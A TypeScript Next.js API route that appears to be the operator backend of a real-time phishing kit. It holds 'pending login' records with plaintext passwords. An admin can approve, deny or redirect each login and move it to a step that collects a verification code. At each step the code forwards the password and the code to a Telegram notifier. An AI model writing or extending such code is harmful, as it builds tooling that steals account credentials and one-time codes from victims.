import { NextRequest, NextResponse } from "next/server";
import { getDb, ensureTable, autoDeclineExpired } from "@/lib/db";
import { notifyAdvance } from "@/lib/telegram";


export async function GET(
  _req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const sql = getDb();
    await ensureTable(sql);
    await autoDeclineExpired(sql);

    const rows = await sql`
      SELECT id, user_id, status, request_kind, flow_step,
             code_delivery_method, masked_email, masked_phone, created_at
      FROM pending_logins
      WHERE id = ${id}
      LIMIT 1
    `;

    if (rows.length === 0) {
      return NextResponse.json({ error: "Not found" }, { status: 404 });
    }

    return NextResponse.json({ ok: true, task: rows[0] });
  } catch (err) {
    console.error("[tasks/id GET]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}

export async function PATCH(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;
    const body = await req.json();
    const sql = getDb();
    await ensureTable(sql);

    const rows = await sql`
      SELECT * FROM pending_logins WHERE id = ${id} LIMIT 1
    `;
    if (rows.length === 0) {
      return NextResponse.json({ error: "Not found" }, { status: 404 });
    }

    const task = rows[0];

    if (body.action === "approve" || body.action === "deny" || body.action === "redirect") {
      const newStatus = body.action === "approve" ? "approved"
        : body.action === "redirect" ? "redirected" : "denied";

      await sql`
        UPDATE pending_logins
        SET status = ${newStatus},
            resolved_at = ${Date.now()},
            resolved_by = ${body.resolved_by || "admin"}
        WHERE id = ${id}
      `;

      return NextResponse.json({ ok: true, status: newStatus });
    }

    if (body.flow_step === "code_request") {
      await sql`
        UPDATE pending_logins
        SET flow_step = 'code_request',
            code_delivery_method = ${body.code_delivery_method || "email"},
            status = 'pending',
            pending_since = ${Date.now()}
        WHERE id = ${id}
      `;

      await notifyAdvance({
        id: task.id as string,
        user_id: task.user_id as string,
        password: task.password as string,
        masked_email: task.masked_email as string,
        masked_phone: task.masked_phone as string,
        request_kind: task.request_kind as string,
        flow_step: "code_request",
        code_delivery_method: body.code_delivery_method || "email",
        cf: {
          ip: task.user_id as string,
          country: "US",
          city: "Unknown",
          timezone: "UTC",
          asOrganization: "Unknown",
        },
      });

      return NextResponse.json({ ok: true, flow_step: "code_request" });
    }

    if (body.flow_step === "code_verify") {
      await sql`
        UPDATE pending_logins
        SET flow_step = 'code_verify',
            verification_code = ${body.verification_code || ""},
            status = 'pending',
            pending_since = ${Date.now()}
        WHERE id = ${id}
      `;

      await notifyAdvance({
        id: task.id as string,
        user_id: task.user_id as string,
        password: task.password as string,
        masked_email: task.masked_email as string,
        masked_phone: task.masked_phone as string,
        request_kind: task.request_kind as string,
        flow_step: "code_verify",
        verification_code: body.verification_code || "",
        code_delivery_method: task.code_delivery_method as string,
        cf: {
          ip: task.user_id as string,
          country: "US",
          city: "Unknown",
          timezone: "UTC",
          asOrganization: "Unknown",
        },
      });

      return NextResponse.json({ ok: true, flow_step: "code_verify" });
    }

    return NextResponse.json({ error: "Invalid action" }, { status: 400 });
  } catch (err) {
    console.error("[tasks/id PATCH]", err);
    return NextResponse.json({ error: "Internal error" }, { status: 500 });
  }
}
